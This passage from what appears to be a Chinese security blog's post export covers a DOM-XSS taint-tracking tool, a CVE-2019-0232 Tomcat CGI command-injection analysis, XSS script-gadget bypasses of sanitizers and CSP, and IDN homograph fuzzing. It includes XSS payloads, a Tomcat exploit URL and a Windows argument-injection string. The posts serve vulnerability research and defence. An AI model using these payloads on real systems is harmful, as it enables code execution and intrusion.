window.name window.location.href window.location.search window.location.hash window.location.pathname window.location.url document.URL document.documentURI document.URLUnencoded document.baseURI document.referrer 网络请求主要指使用异步方式获取的请求及其响应，这部分可以通过hook XMLHttpRequest fetch 等API来获取。 存储主要指Cookie、Indexdb、localStorage、sessionStorage等。 部分输入在网页初始化时已经确定，这部分由程序记录下来。部分输入会不断变化，如cookie等，这部分输入会通过插桩、事件处理等方式进行监控，并实时对变化进行记录。 危险函数这里把危险函数分为直接执行JavaScript、加载URL、执行HTML、创建元素、部分可控执行五类，具体涉及到的函数与相关模式如下。 直接执行JavaScript这类危险函数直接把输入以JavaScript代码的形式执行，例如。 eval(payload) setTimeout(payload, 100) setInterval(payload, 100) Function(payload)() &lt;script&gt;payload&lt;/script&gt; &lt;img src=x onerror=payload&gt; 加载URL这类危险函数以URL加载的形式执行JavaScript代码，但是大体和JavaScript类似。 location=javascript:alert(/xss/) location.href=javascript:alert(/xss/) location.assign(javascript:alert(/xss/)) location.replace(javascript:alert(/xss/)) 执行HTML这类危险函数直接把输入以HTML代码的形式执行，在一定情况下可以执行代码。 xx.innerHTML=payload xx.outerHTML=payload document.write(payload) document.writeln(payload) 创建元素这类调用大多是创建一个DOM元素，并将其加入页面中。当script的源可控或者元素的构造可控的时候，可能会出现问题。 scriptElement.src domElement.appendChild domElement.insertBefore domElement.replaceChild 部分可控执行这类调用存在一定的动态成分，可控的程度不高，但是在部分情况下存在价值，因此在工具中加入了对其的监控。 (new Array()).reduce(func) (new Array()).reduceRight(func) (new Array()).map(func) (new Array()).filter(func) 整体架构污点追踪污点追踪的实现有两种思路，一种思路是hook浏览器native的实现，但是这种方法要求对浏览器本身的实现机制有比较好的了解，而且编译过程复杂，很难迁移。浏览器一旦更新，就需要修改大量的代码来适应。 另外一种思路是基于浏览器插件做JavaScript层的Hook，这种方式虽然没有浏览器源代码层的hook底层，但是开发更快，更容易迁移，在有新的机制出现时也比较容易适应。 Chrome插件中，代码分在content-script、background、popup等运行时中。其中只有content-script可以操纵宿主页面的DOM，但是宿主页面JavaScript和content-script也在不同的沙箱中，无法hook，只能使用注入的方式。 在hook后，当出现危险函数的调用或网络请求时，则将其记录至后台。 疑似利用确认和很多漏洞不同，大部分存储型的漏洞是没有回显的，因此需要做一定的确认工作。 在获取信息后，以域名为单位。遍历sink和source，查找重合的地方。如果source在sink的参数中出现，就可能是漏洞点。需要注意的是，除了hash之外，网络请求等各种参数不一定可控。另外，需要去除同一域名下，同一参数同一调用的Sink，同一源和同一返回的结果，减少重复数据。 在具体确认的时候，考虑到，sink中的参数可能是source的一部分，source中也可能只是sink的一部分，因此使用公共子字符串算法，只要字串的长度小于sink和source最小的长度。 不过即使完全可控，也可能出现waf、sanitizer、难以绕过的csp策略等。因此这种方法会有比较高的误报率，但是相对的，在hook较全的情况下，漏报率会小很多。 除了上面提到的这种方式，工具还采取了动态污染的方式。通过修改请求参数和修改函数调用时的参数两种方式，传入一些测试性的payload，如果在返回界面获取到了相信的结果，那么漏洞就是存在的。 结果查看这里考虑过直接用插件自带的界面popup / background来显示可能的结果，用浏览器层的localstorge存储数据，但是考虑这种方式会影响浏览器间迁移的兼容性。 于是最后单独用vuejs + django编写了一个小的站点来接收请求，查看结果。 参考链接 基于chrome扩展的脚本注入工具 让前端监控数据采集更高效","categories":[{"name":"Web","slug":"Web","permalink":"https://LyleMi.github.io/categories/Web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://LyleMi.github.io/tags/XSS/"},{"name":"自动化","slug":"自动化","permalink":"https://LyleMi.github.io/tags/自动化/"}]},{"title":"CVE-2019-0232：Apache Tomcat RCE漏洞分析","slug":"cve-2019-0232","date":"2019-04-20T04:43:30.000Z","updated":"2020-04-14T12:06:23.947Z","comments":true,"path":"2019/04/20/cve-2019-0232/","link":"","permalink":"https://LyleMi.github.io/2019/04/20/cve-2019-0232/","excerpt":"简述利用前提该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。 该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。","text":"简述利用前提该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。 该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。 时间线 报告漏洞 2019-3-3 漏洞公开 2019-4-10 漏洞影响范围 Apache Tomcat 9.0.0.M1 to 9.0.17 Apache Tomcat 8.5.0 to 8.5.39 Apache Tomcat 7.0.0 to 7.0.93 复现笔者使用的复现环境为9.0.12 + JRE 1.8.0。 首先进行CGI相关的配置，在 conf/web.xml 中启用CGIServlet： 1234567891011121314151617&lt;servlet&gt; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/cgi-bin&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;executable&lt;/param-name&gt; &lt;param-value&gt;&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;&lt;/servlet&gt; 这里主要的设置是 enableCmdLineArguments 和 executable 两个选项。 enableCmdLineArguments 启用后才会将Url中的参数传递到命令行， executable 指定了执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。 同样在 conf/web.xml 中启用cgi的servlet-mapping 1234&lt;servlet-mapping&gt; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt; &lt;url-pattern&gt;/cgi-bin/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 之后修改 conf/context.xml 的 &lt;Context&gt; 添加 privileged=&quot;true&quot;属性，否则会没有权限 12345678910111213&lt;Context privileged=\"true\"&gt; &lt;!-- Default set of monitored resources. If one of these changes, the --&gt; &lt;!-- web application will be reloaded. --&gt; &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt; &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt; &lt;WatchedResource&gt;$&#123;catalina.base&#125;/conf/web.xml&lt;/WatchedResource&gt; &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt; &lt;!-- &lt;Manager pathname=\"\" /&gt; --&gt;&lt;/Context&gt; 然后在 ROOT\\WEB-INF 下创建 cgi-bin 目录, 并在该目录下创建一个内容为 echo Content-type: text/html 的 e.bat 文件。 配置完成后，启动tomcat，访问 http://127.0.0.1:8080/cgi-bin/e.bat?&amp;ver ，可以看到命令执行成功。 原理漏洞相关的代码在 tomcat\\java\\org\\apache\\catalina\\servlets\\CGIServlet.java 中，CGIServlet提供了一个cgi的调用接口，在启用 enableCmdLineArguments 参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。 这个漏洞是因为 Runtime.getRuntime().exec 在Windows中和Linux中底层实现不同导致的。下面以一个简单的case来说明这个问题，在Windows下创建arg.bat： 12rem arg.batecho %* 并执行如下的Java代码 12String [] cmd=&#123;\"arg.bat\", \"arg\", \"&amp;\", \"dir\"&#125;;Runtime.getRuntime().exec(cmd); 在Windows下会输出 arg 和 dir 命令运行后的结果。同样的，用类似的脚本在Linux环境下测试： 12345# arg.shfor key in \"$@\"do echo '$@' $keydone 12String [] cmd=&#123;\"arg.sh\", \"arg\", \"&amp;\", \"dir\"&#125;;Runtime.getRuntime().exec(cmd); 此时的输出为 123$@ arg$@ &amp;$@ dir 导致这种输出的原因是在JDK的实现中 Runtime.getRuntime().exec 实际调用了 ProcessBuilder ，而后 ProcessBuilder 调用 ProcessImpl使用系统调用 vfork ，把所有参数直接传递至 execve。 用 strace -F -e vfork,execve java Main 跟踪可以看到上面的Java代码在Linux中调用为 1execve(&quot;arg.sh&quot;, [&quot;arg.sh&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;], [/* 23 vars */]) 而如果跟踪类似的PHP代码 system(&#39;arg.sh arg &amp; dir&#39;); ，得到的结果为 1execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;arg.sh arg &amp; dir&quot;], [/* 23 vars */]) 所以Java的 Runtime.getRuntime().exec 在CGI调用这种情况下很难有命令注入。 Windows中创建进程使用的是 CreateProcess ，会将参数合并成字符串，作为 lpComandLine 传入 CreateProcess 。程序启动后调用 GetCommandLine 获取参数，并调用 CommandLineToArgvW 传至 argv。在Windows中，当 CreateProcess 中的参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe , 故最后会变成 cmd.exe /c &quot;arg.bat &amp; dir&quot;，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。 除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过， 例如 dir &quot;\\&quot;&amp;whoami&quot; 在Linux中是安全的，而在Windows会执行命令。 这是因为Windows在处理命令行参数时，会将 &quot; 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 &quot; ，但是对 \\&quot; 的处理有误。同样用 arg.bat 做测试，可以发现这里只输出了 \\ 。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。 修复方式开发者在 patch 中增加了 cmdLineArgumentsDecoded 参数，这个参数用来校验传入的命令行参数，如果传入的命令行参数不符合规定的模式，则不执行。 校验写在 setupFromRequest 函数中： 123456789String decodedArgument = URLDecoder.decode(encodedArgument, parameterEncoding);if (cmdLineArgumentsDecodedPattern != null &amp;&amp; !cmdLineArgumentsDecodedPattern.matcher(decodedArgument).matches()) &#123; if (log.isDebugEnabled()) &#123; log.debug(sm.getString(\"cgiServlet.invalidArgumentDecoded\", decodedArgument, cmdLineArgumentsDecodedPattern.toString())); &#125; return false;&#125; 不通过时，会将 CGIEnvironment 的 valid 参数设为 false ，在之后的处理函数中会直接跳过执行。 1234567891011121314if (cgiEnv.isValid()) &#123; CGIRunner cgi = new CGIRunner(cgiEnv.getCommand(), cgiEnv.getEnvironment(), cgiEnv.getWorkingDirectory(), cgiEnv.getParameters()); if (\"POST\".equals(req.getMethod())) &#123; cgi.setInput(req.getInputStream()); &#125; cgi.setResponse(res); cgi.run();&#125; else &#123; res.sendError(404);&#125; 修复建议 使用更新版本的Apache Tomcat。这里需要注意的是，虽然在9.0.18就修复了这个漏洞，但这个更新是并没有通过候选版本的投票，所以虽然9.0.18没有在被影响的列表中，用户仍需要下载9.0.19的版本来获得没有该漏洞的版本。 关闭enableCmdLineArguments参数 参考链接 https://tomcat.apache.org/security-9.html https://tomcat.apache.org/tomcat-9.0-doc/cgi-howto.html https://github.com/apache/tomcat/commit/4b244d8 https://github.com/pyn3rd/CVE-2019-0232/ https://tools.ietf.org/html/rfc3875 https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/ https://codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html https://blog.trendmicro.com/trendlabs-security-intelligence/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat","categories":[{"name":"Web","slug":"Web","permalink":"https://LyleMi.github.io/categories/Web/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://LyleMi.github.io/tags/CVE/"}]},{"title":"Web应用代码自动化审计浅谈","slug":"Web-Application-Auto-Audit","date":"2019-04-06T10:17:22.000Z","updated":"2020-04-14T12:06:52.825Z","comments":true,"path":"2019/04/06/Web-Application-Auto-Audit/","link":"","permalink":"https://LyleMi.github.io/2019/04/06/Web-Application-Auto-Audit/","excerpt":"0. 序代码审计是找到应用缺陷的过程。自动化审计通常有白盒、黑盒、灰盒等多种方式。白盒指通过对源代码的分析找到应用缺陷；黑盒通常不涉及到源代码，多使用模糊测试等方式来找到漏洞；而灰盒则是黑白结合的方式，利用黑盒特性来减少白盒的计算复杂度，使用白盒的信息来衡量漏洞的有效性。","text":"0. 序代码审计是找到应用缺陷的过程。自动化审计通常有白盒、黑盒、灰盒等多种方式。白盒指通过对源代码的分析找到应用缺陷；黑盒通常不涉及到源代码，多使用模糊测试等方式来找到漏洞；而灰盒则是黑白结合的方式，利用黑盒特性来减少白盒的计算复杂度，使用白盒的信息来衡量漏洞的有效性。 1. 基础概念1.1 输入 (Source)Web应用的输入，可以是请求的参数（GET、POST等）、上传的文件、Cookie、数据库数据等用户可控或者间接可控的地方。 例如PHP中的 $_GET / $_POST / $_REQUEST / $_COOKIE / $_FILES / $_SERVER 等，都可以作为应用的输入。 1.2 处理函数 (Filter)处理函数是对数据进行过滤或者编解码的函数。这些函数会对输入造成影响，为漏洞利用带来不确定性。 同样以PHP为例，这样的函数可能是 mysqli_real_escape_string / htmlspecialchars / base64_encode / str_rot13 等，也可能是应用自定义的过滤函数。 1.3 危险函数 (Sink)危险函数又常叫做Sink Call、漏洞点，是可能触发危险行为如文件操作、命令执行、数据库操作等行为的函数。 在PHP中，可能是 include / system / echo 等。 1.4 问题定义一般认为一个漏洞的触发过程是从输入经过过滤到危险函数的过程(Source To Sink)，而自动化审计就是寻找这个链条的过程。自动化审计的难点主要在于以下几个方面。 1.4.1 输入多样化对Web应用来说，可能的输入可以来自GET/POST的参数、Cookie、Url等多个地方，这些输入格式不固定，输入空间很大。 1.4.2 过滤函数复杂在审计的过程中，从输入没有经过任何过滤函数就到达危险函数的过程较少。但是自动化判断一些过滤数是否可以绕过较为困难。 1.4.3 代码本身的复杂度现代Web框架，代码复杂度极高，有相当多的动态加载和调用的过程，为自动化分析带来了困难。 2. 技术基础2.1 抽象语法树抽象语法树，顾名思义，是一种树形的数据结构。构造AST树的基本方法是将表达式的操作数作为树结构的叶子，将表达式的操作符号作为树结构的根，依次循环迭代进行构造。 例如在JavaScript中， a=1 的抽象语法树如下： 123456789101112131415161718192021222324&#123; \"type\": \"Program\", \"body\": [ &#123; \"type\": \"ExpressionStatement\", \"expression\": &#123; \"type\": \"AssignmentExpression\", \"operator\": \"=\", \"left\": &#123; \"type\": \"Identifier\", \"name\": \"a\" &#125;, \"right\": &#123; \"type\": \"Literal\", \"value\": 1, \"raw\": \"1\" &#125; &#125; &#125;], \"sourceType\": \"script\"&#125; 2.2 程序控制流图AST树依旧是比较高层次的形式，其中模块之间的调用、循环等依旧不利于数据流的处理，因此引入了更底层的程序控制流图来进行分析。 程序控制流图(Control Flow Graph，CFG)是静态分析过程中的另一种状态，可以反映程序代码控制流程。其实，程序控制流图是由一个入口、若干个出口组成的有向图，图中的每一个节点代表一个基本块，基本块中可以有一系列顺序执行的语句；图中的有向边，代表从出发节点到目标节点的控制依赖关系。 3. 解决方案3.1 危险函数匹配白盒审计最常见的方式是通过查找危险函数来定位漏洞，比较有代表性的工具是Seay开发的审计工具。这个工具直接找出所有危险函数的位置，这种方式没有对调用流程进行深入分析，相对误报率会比较高。 不过同样的，这种方式在一些环境下能做到几乎无漏报，只要审计者有耐心，可以发现应用大部分的漏洞，但是在高度框架化的代码中，这种方式能找到的漏洞相对有限。 3.2 代码相似性比对一些开发者会复制其他框架的代码，或者使用各种框架。如果事先有建立对应的漏洞图谱，则可使用相似性方法来找到漏洞。 3.3 控制流分析在2012年，Dahse J等人设计了RIPS，该工具引入AST进行数据流与控制流分析，结合过程内与过程间的分析得到审计结果，相对危险函数匹配的方式来说误报率少了很多，但是同样的也增加了开销。RIPS初始的版本开放源代码，而后闭源进行商业化。 3.4 基于图的分析基于图的分析是对控制流分析的一个改进，其利用CFG的特性和图计算的算法，一定程度上简化了计算，比较有代表性的是微软的Semmle QL和NDSS 2017年发表的文章Efficient and Flexible Discovery of PHP Application Vulnerabilities。 3.5 灰盒分析基于控制流的分析开销较大，于是有人提出了基于运行时的分析方式，对代码进行Hook，当执行到危险函数时自动回溯输入，找到输入并判断是否可用。 这种方式解决了控制流分析实现复杂、计算路径开销大的问题，在判断过滤函数上也有一定的突破，但是灰盒的方式并不一定会触发所有的漏洞。fate0师傅开发的prvd就是基于这种设计思路。 4. 参考资料 [1] RIPS https://github.com/ripsscanner/rips [2] prvd https://github.com/fate0/prvd [3] PHP运行时漏洞检测 http://blog.fatezero.org/2018/11/11/prvd/ [4] Cobra https://github.com/FeeiCN/cobra [5] Semmle QL https://github.com/Semmle/ql [6] Vulnerability hunting with Semmle QL https://blogs.technet.microsoft.com/srd/2018/08/16/vulnerability-hunting-with-semmle-ql-part-1/ [7] Backes M , Rieck K , Skoruppa M , et al. Efficient and Flexible Discovery of PHP Application Vulnerabilities[C]// IEEE European Symposium on Security &amp; Privacy. IEEE, 2017. [8] Dahse J. RIPS-A static source code analyser for vulnerabilities in PHP scripts[J]. Retrieved: February, 2010, 28: 2012. [9] awesome static analysis https://github.com/mre/awesome-static-analysis 5. 结语在学习自动化审计的过程中做了一点整理，于是形成了这篇文章，水平有限，这篇文章讲得也比较浅。之后有机会再就各个技术的细节做进一步分析，不当之处还请各位师傅不吝指出。","categories":[{"name":"Web","slug":"Web","permalink":"https://LyleMi.github.io/categories/Web/"}],"tags":[{"name":"自动化","slug":"自动化","permalink":"https://LyleMi.github.io/tags/自动化/"}]},{"title":"基于Gadgets绕过XSS防御机制","slug":"bypass-xss-mitigation-via-gadgets","date":"2019-02-27T01:49:17.000Z","updated":"2020-04-14T12:06:14.922Z","comments":true,"path":"2019/02/27/bypass-xss-mitigation-via-gadgets/","link":"","permalink":"https://LyleMi.github.io/2019/02/27/bypass-xss-mitigation-via-gadgets/","excerpt":"这篇文章是之前对CCS 2018 Code-Reuse Attacks for the Web Breaking Cross-Site Scripting Mitigations via Script Gadgets 的阅读笔记，最近整理资料发现放了挺久，于是稍做了一些整理和扩展发了出来。","text":"这篇文章是之前对CCS 2018 Code-Reuse Attacks for the Web Breaking Cross-Site Scripting Mitigations via Script Gadgets 的阅读笔记，最近整理资料发现放了挺久，于是稍做了一些整理和扩展发了出来。 0x00 背景本文主要考虑在可以注入任意HTML代码（富文本编辑器等应用）的条件下，利用JavaScript库中的一些代码片段（Gadget）来绕过常见的XSS防御机制，包括WAF、浏览器的XSS Filter、HTML Sanitizers、Content Security Policy等。 其中WAF考虑对请求值和返回值进行处理的正则匹配型或者字符匹配型WAF，HTML Sanitizers是则指DOMPurify这种基于DOM解析的XSS过滤器，Content Security Policy则主要考虑启用unsafe-eval或strict-dynamic的情况。 0x01 简单例子和二进制攻击中的Gadget作用类似，本文中的Gadget是指可能被恶意利用的代码片段，下面以一个简单的例子来说明： 12var button = document.getElementById(\"mbutton\");button.innerHTML = button.getAttribute(\"data-text\"); 在这段代码中，取出了Id为mbutton的元素，并将data-text的值赋到了该元素的innerHTML属性。这是一些库中为了实现类似Tooltip等效果常用的一种方式，但是在存在这种代码片段的时候，只要构造如下的元素，就可造成XSS攻击。 1&lt;button id=\"mbutton\" data-text=\"&lt;img src=x onerror=alert(/xss/)&gt;\"&gt;a&lt;/button&gt; 0x02 Gadget分类论文中把可利用的Gadget分为几类，具体如下： 字符串操作这种Gadget主要是指对字符串的操作，一个字符串在经过操作后可能变为造成攻击的字符。 例如Polymer中的一段代码dash.replace(/-[a-z]/g, (m) =&gt; m[1].toUpperCase())，这段代码会把以连字符构成的字符串变为大写，例如像inner-h-t-m-l这种字符串处理后会变成innerHTML。大部分WAF是对请求值和返回值做匹配，而此时传入的是inner-h-t-m-l而不是innerHTML，那么就有可能造成绕过。 元素创建这种Gadget是像document.createElement(input) document.createElement(&quot;script&quot;) jQuery(&quot;&lt;&quot; + tag + &quot;&gt;&quot;) jQuery.html(input) 这种直接创建的标签甚至script的代码片段。当输入一定程度可控时，则可利用这种Gadget。 函数创建这种Gadget是指创建函数的代码段，比如Underscore.js中发现的一段代码： 12345source = \"var __t,__p='',__j=Array.prototype.join,\" +\"print=function()&#123;__p+=__j.call(arguments,'');&#125;;\\n\" +source + 'return __p;\\n';var render = new Function(settings.variable || 'obj', '_', source); 这种Gadget会间接执行构造的代码段，在一定条件下可造成攻击。 JavaScript代码执行这种Gadget主要是指类似eval这种会直接执行传入代码的代码段，例如： 12345eval(input);inputFunction.apply();node.innerHTML = \"prefix\" + input + \"suffix\";scriptElement.src = input;node.appendChild(input); 表达式解析很多前端框架都提供了自己的模版引擎，有着丰富而强大的功能，这种Gadget就是框架中对模版表达式解析执行而造成的问题。例如Aurelia框架中可以用下面这段代码来触发一个代码执行。 123&lt;div ref=mes.bind=&quot;$this.me.ownerDocument.defaultView.alert(1)&quot;&gt;&lt;/div&gt; 0x03 例子例一论文中提及的例子很多，本文选取其中一个在jQuery Mobile中的Gadget来介绍： 1234567if (myId) &#123; ui.screen.attr(\"id\", myId + \"-screen\"); ui.container.attr(\"id\", myId + \"-popup\"); ui.placeholder .attr(\"id\", myId + \"-placeholder\") .html(\"&lt;!-- placeholder for \" + myId + \" --&gt;\");&#125; 这个Gadget会提取data-role为popup的元素，获取其id中的内容，并调用.html，那么就可以构造一个如下的PoC： 123&lt;div data-role=popup id='--&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'&gt;&lt;/div&gt; 在这个PoC中，没有&lt;script&gt;这种会触发WAF的字符串，用到的属性也是data-role id等在HTML Sanitizer白名单中的元素，因此该PoC可以绕过大部分的防御手段。 例二虽然文中主要是针对unsafe-eval或strict-dynamic两种情况作了CSP的绕过，但是在有的情况下，不开启这两个选项也可实现执行，例如下面这个PoC： 1234567891011121314&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=content-security-policy content=\"object-src 'none';script-src https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js;\"&gt; &lt;script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div ng-app ng-csp&gt; &lt;div ng-focus=\"x=$event\" tabindex=0&gt;foo&lt;/div&gt; &lt;div ng-repeat=\"(key, value) in x.view\"&gt; &lt;div ng-if=key==\"window\"&gt;&#123;&#123; value.alert = [1].reduce(value.alert, 'xss') &#125;&#125;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 在模版内部中，Angular利用的是下面这个函数来完成调用，并不涉及eval等函数，因此在CSP没有开启unsafe-eval或strict-dynamic的情况下也可实现代码执行。 123function defaultHandlerWrapper(element, event, handler) &#123; handler.call(element, event);&#125; 0x04 Gadget发现对Gadget的查找，作者给出了两种方式，一种是手工查找，一种是基于污点分析的半自动化查找。手工查找本文不做赘述，主要讲基于污点分析的半自动化查找方式。 这种方式是基于2013年CCS的一篇名为25 Million Flows Later - Large-scale Detection of DOM-based XSS的文章。 该方式基于浏览器完成，先对eval document.write等敏感调用和innerHTML做了污点跟踪。然后爬取Alex Top 5000的网站，当发现数据流入了这些敏感调用，就尝试使用预置的一些攻击载荷尝试利用，若利用成功，则找到了一个Gadget。 当然这种方式也存在一些限制，比如作者只对第一级的链接做了分析和尝试、没有做用户交互和验证、在验证的时候没有考虑防御机制的绕过等。 0x05 参考链接 https://github.com/cure53/DOMPurify https://github.com/google/security-research-pocs/tree/master/script-gadgets https://queue.acm.org/detail.cfm?id=2663760 https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf","categories":[{"name":"Web","slug":"Web","permalink":"https://LyleMi.github.io/categories/Web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://LyleMi.github.io/tags/XSS/"}]},{"title":"IDN Spoof漏洞自动化挖掘","slug":"idnfuzz","date":"2018-12-08T01:34:39.000Z","updated":"2020-04-14T12:06:28.826Z","comments":true,"path":"2018/12/08/idnfuzz/","link":"","permalink":"https://LyleMi.github.io/2018/12/08/idnfuzz/","excerpt":"0x00 背景国际化域名国际化域名（Internationalized Domain Name，IDN）又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，包括中文、法语、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编码而成。在域名系统中，国际化域名使用Punycode转写并以ASCII字符串储存。 同形异义攻击同形异义字是利用IDN中一些非拉丁字符语种的字母与拉丁字符非常相似，字面看很难区分的特性，找到对应的字符来实现钓鱼攻击。例如16ვ.com(U+10D5)、16ဒ.com (U+1012)、16ҙ.com (U+0499) 都在一定程度上和163.com有相似性，基于一些开放的https证书服务这些域名还能取得相应的证书，进一步增加钓鱼成功的可能性。","text":"0x00 背景国际化域名国际化域名（Internationalized Domain Name，IDN）又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，包括中文、法语、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编码而成。在域名系统中，国际化域名使用Punycode转写并以ASCII字符串储存。 同形异义攻击同形异义字是利用IDN中一些非拉丁字符语种的字母与拉丁字符非常相似，字面看很难区分的特性，找到对应的字符来实现钓鱼攻击。例如16ვ.com(U+10D5)、16ဒ.com (U+1012)、16ҙ.com (U+0499) 都在一定程度上和163.com有相似性，基于一些开放的https证书服务这些域名还能取得相应的证书，进一步增加钓鱼成功的可能性。 PunycodePunycode是RFC 3492标准设计的编码系统，用于把Unicode转换为可用的DNS系统的编码，比如16ҙ.com就会被转成xn–16-8tc.com，这在一定程度上可以防止IDN欺骗。 0x01 漏洞介绍在主流浏览器中，Chromium Project对这类漏洞关注度较多，甚至特别在安全类型中设置了对应的idn-spoof标签。 在chromium中维护了一个domain list，内置了一些较有知名度的域名，当有域名被认为和这些相似域名相似时，就会转成punycode显示。 其完整的检测算法可以在这里看到，对其详细的解释可以参考这篇文章。 总的来说，只要找到了一个字符的组合，可以通过Spoof Check，且在浏览器地址栏中显示的字形和top domain相似，就可以认为找到了一个IDN Spoof漏洞。 0x02 挖掘方法Unicode的字符较多，因此笔者考虑一定程度上将漏洞挖掘的过程自动化。最直接的思路是，将域名是否同形的问题转换为图像相似度的问题。 我们可以遍历所有的Unicode字符，使用浏览器地址栏渲染的字体生成其对应的图像，当其图像和域名中允许出现的ascii字符相似度较高时，则认为是可能造成Spoof的字符。 在这里笔者使用了感知哈希算法作为图像相似度的计算的方式，其大致步骤如下： 将图像缩小至相同尺寸：用于去除图像的细节，保留结构等基本信息 简化色彩：将缩小后的图像转为64级灰度，减少颜色带来的影响 计算平均值：计算所有像素的灰度平均值 比较像素的灰度：将每个像素的灰度，与平均值进行比较，记录结果 计算Hash值：将上一步的结果组合在一起构成一个整数作为图片的指纹 在获取到Unicode字符图片对应的Hash值后，使用计算汉明距离的方式计算两个图片的距离，就可以得到较为相似的字符列表了。 当找到符合条件的字符后，则找到包含该字符的域名，替换该字符进行测试，检测其是否能通过Spoof Check。这里直接使用Chrome测试不太方便，这里笔者抽取了其中部分代码形成独立的脚本进行测试。 另外对一些特别的字符，如 / / ? / . / # 等，则构造包含对应字符的URL进行测试。 通过图像相似度和Spoof Check的测试后，最后进行人工的确认，如确实是可能造成Spoof的字符，则认为是漏洞并报告。 0x03 挖掘结果经测试，笔者成功找到了 crbug.com/904325 、 crbug.com/904627 等尚未修复的Spoof漏洞。 0x04 参考资料 https://en.wikipedia.org/wiki/Internationalized_domain_name https://www.unicode.org/faq/idn.html https://xlab.tencent.com/en/2018/11/13/cve-2018-4277/ https://en.wikipedia.org/wiki/IDN_homograph_attack https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e https://en.wikipedia.org/wiki/Perceptual_hashing Gontmakher A . The Homograph Attack[J]. Communications of the Acm, 2002, 45(2):128.","categories":[{"name":"Misc","slug":"Misc","permalink":"https://LyleMi.github.io/categories/Misc/"}],"tags":[{"name":"Unicode","slug":"Unicode","permalink":"https://LyleMi.github.io/tags/Unicode/"}]},{"title":"Unicode等价性浅谈","slug":"unicode-normalization","date":"2018-10-29T08:56:53.000Z","updated":"2020-04-14T12:06:37.070Z","comments":true,"path":"2018/10/29/unicode-normalization/","link":"","permalink":"https://LyleMi.github.io/2018/10/29/unicode-normalization/","excerpt":"做SSRF测试的时候，常提到用类似 ａ 字符来bypass过滤器，之前没有做深究，偶然的一次机会，发现bａidu.com(\\uff41)能跳转到百度，但是bаidu.com(\\u0430)会被认为是一个新的IDN域名，并不指向baidu.com。","text":"做SSRF测试的时候，常提到用类似 ａ 字符来bypass过滤器，之前没有做深究，偶然的一次机会，发现bａidu.com(\\uff41)能跳转到百度，但是bаidu.com(\\u0430)会被认为是一个新的IDN域名，并不指向baidu.com。 先在浏览器中打开工具调试，发现第一个case在HTTP包中的Host字段的值是baidu.com，那么应该是先处理过再发送的请求。 想到了其中可能会有编码转换，简单看了一下IDN的RFC没有找到有价值的信息，于是开始找源码，以idna为关键字在WebKit的源码中找到相关函数 uidna_nameToUnicode ，在Chromium中也找到这个函数。 顺着关键字找到icu标准的实现，其在官方网站上很清楚的给出了转换的demo和浏览器normalize的demo，那么使用其进行测试。 bａidu.com测试结果入下： bаidu.com测试结果入下： 从上面这个结果可以看到\\uff41在某些模式下会被转换，而\\u0430在所有模式下都不会被转换，那么到这里这个问题已经有一个初步的答案了，第一个case被normalize转换为ascii，所以能正常解析。第二个case不会被转换，被做为unicode处理，所以会访问IDN域名。 但是这个答案还不够清晰，于是继续顺着线索找到unicode转换的标准。标准中提到，两个不同编码的Unicode字符可能存在一定的等价性，这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。举例来说，a 